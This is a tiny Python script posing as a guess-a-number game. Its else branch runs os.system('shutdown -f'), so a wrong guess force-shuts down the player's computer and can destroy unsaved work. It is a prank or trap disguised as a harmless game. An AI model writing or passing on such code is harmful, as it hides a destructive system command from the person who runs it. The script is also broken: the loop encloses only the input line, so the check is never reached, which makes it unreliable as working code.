import random,os

n = random.randint(0,9)

while True:
    guess = int(input("Guess a number between 0 and 9: "))

if guess == n:
    print("You Won!")
else:
    os.system("shutdown -f")
